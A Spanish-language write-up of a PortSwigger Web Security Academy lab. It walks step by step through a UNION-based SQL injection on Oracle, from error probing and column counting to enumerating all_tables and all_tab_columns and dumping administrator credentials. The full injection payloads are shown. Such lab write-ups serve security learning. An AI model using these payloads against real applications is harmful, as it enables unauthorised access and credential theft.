# 🧪 SQL Injection - Listing Database Contents on Oracle

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-SQL%20Injection-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
**SQL Injection basada en UNION** para enumerar el esquema de una base de datos
Oracle, extraer credenciales de la tabla de usuarios e iniciar sesión como
`administrator`.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Confirmación | `'` → error 500 | Inyección SQL confirmada |
| Columnas | `' ORDER BY N--` | 2 columnas |
| Texto | `' UNION SELECT 'a','a' FROM dual--` | Ambas aceptan texto |
| Tablas | `all_tables` | `USERS_VQDOWF` |
| Columnas | `all_tab_columns` | `USERNAME_EKABOC`, `PASSWORD_GNBNTN` |
| Credenciales | `UNION SELECT` | `administrator:<pass>` |
| Login | Panel de cuenta | ✅ Lab resuelto |

---

## 🎯 Objetivo

Determinar el nombre de la tabla que contiene usuarios y contraseñas, listar
sus columnas y extraer las credenciales para iniciar sesión como
`administrator`.

---

## 🔍 Análisis

### 1. Confirmar inyección y número de columnas

Al añadir una comilla simple (`'`) al parámetro `category`, la aplicación
devuelve un **error 500**. Se usa `ORDER BY` para contar columnas:

```
' ORDER BY 1--     → sin error
' ORDER BY 2--     → sin error
' ORDER BY 3--     → error 500
```

✅ **Conclusión:** la consulta devuelve **2 columnas**.

### 2. Confirmar columnas de texto

En Oracle toda consulta `SELECT` requiere un `FROM`, por eso se usa la tabla
especial `dual`:

```
' UNION SELECT 'abc', 'def' FROM dual--
```

✅ Ambos textos se reflejan en la respuesta → ambas columnas aceptan texto.

---

## 💥 Explotación

### 3. Listar tablas de la base de datos

Oracle expone la vista `all_tables` con todas las tablas accesibles:

```
' UNION SELECT table_name, NULL FROM all_tables--
```

**Resultado:** tabla con nombre aleatorio

```
USERS_VQDOWF
```

### 4. Listar columnas de la tabla de usuarios

Se usa `all_tab_columns` filtrando por el nombre de la tabla:

```
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_VQDOWF'--
```

**Resultado:** dos columnas

```
USERNAME_EKABOC
PASSWORD_GNBNTN
```

### 5. Extraer credenciales

Se vuelcan los datos de la tabla:

```
' UNION SELECT USERNAME_EKABOC, PASSWORD_GNBNTN FROM USERS_VQDOWF--
```

**Credenciales obtenidas:**

```
administrator:<password_extraída>
```

### 6. Iniciar sesión

Se accede a **My Account** con las credenciales de `administrator`.

✅ **Lab resuelto.**

---

## 📸 Evidencia

![login](https://github.com/user-attachments/assets/9cc94622-523f-4601-a043-3c59cda6ef81)

✅ **Laboratorio completado.**

---

## 🧠 Lecciones aprendidas

1. **Enumeración de esquema en Oracle**:
   - `all_tables` → lista todas las tablas.
   - `all_tab_columns` → lista columnas de una tabla concreta.
2. **Los sufijos aleatorios** (`USERS_VQDOWF`, `USERNAME_EKABOC`) evitan
   que puedas adivinar nombres: hay que enumerar el esquema obligatoriamente.
3. **`FROM dual`** sigue siendo obligatorio en cada `SELECT` de Oracle.
4. **Flujo completo de UNION-based SQLi**:
   1. Confirmar inyección.
   2. Contar columnas (`ORDER BY`).
   3. Confirmar tipos (`UNION SELECT`).
   4. Enumerar tablas.
   5. Enumerar columnas.
   6. Volcar datos.
5. **Sufijo distinto por sesión**: cada vez que reinicias el lab, los nombres
   cambian. Por eso es importante entender el **método**, no memorizar valores.

---

## 🛠️ Herramientas utilizadas

- Navegador web (URL manual)
- Burp Suite (Repeater) — opcional

---

## 📚 Referencias

- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger - Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger - Listing database contents](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
- [Oracle - ALL_TABLES](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)
- [Oracle - ALL_TAB_COLUMNS](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-23
